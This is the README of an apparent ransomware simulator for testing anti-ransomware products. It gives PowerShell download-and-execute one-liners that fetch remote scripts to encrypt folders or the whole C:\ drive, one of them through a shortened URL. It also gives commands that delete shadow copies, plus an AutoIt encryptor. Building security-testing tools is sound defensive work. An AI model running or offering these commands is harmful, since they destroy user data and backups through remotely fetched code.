# RansomSimulator

Fileless ransomware simulator - to evaluate your anti-ransomware mitigation technology

**Example:**

Encryption - 

PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Encrypt -Path 'C:\Users\tester\Documents\Test';

You may use shortlinks as well, example: 

PS> IEX (New-Object Net.WebClient).DownloadString("https://lnkd.in/gzTmAiKu"); Invoke-RansomSIM -Mode Encrypt -Path 'C:\';

Decryption - 

PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Decrypt -Path 'C:\Users\tester\Documents\Test';

# AutoIt
An autoIt script - you may compile it to an executable using Aut2Exe, or execute it using the interpreter (encrypts only .doc files)

**Example:**

Encryption - 

RansomSIM.exe /encrypt C:\
  
Decryption - 

RansomSIM.exe /decrypt C:\

# Simulator for shadow copy manipulation
an aggregation of technique as implemented by ransomware groups to delete shadow copies, usually is performed before the ransomware encryption

Example ('All','VssDeleteAll', 'WmiDeleteAll', 'VssResize', 'DeleteEach', 'CimDelete', 'NativeDelete'):

PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-ShadowDeleteSIM"); Invoke-ShadowDeleteSIM -Mode All -Volume 'C:\\'

PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-ShadowDeleteSIM"); Invoke-ShadowDeleteSIM -Mode VssDeleteAll -Volume 'C:\\'

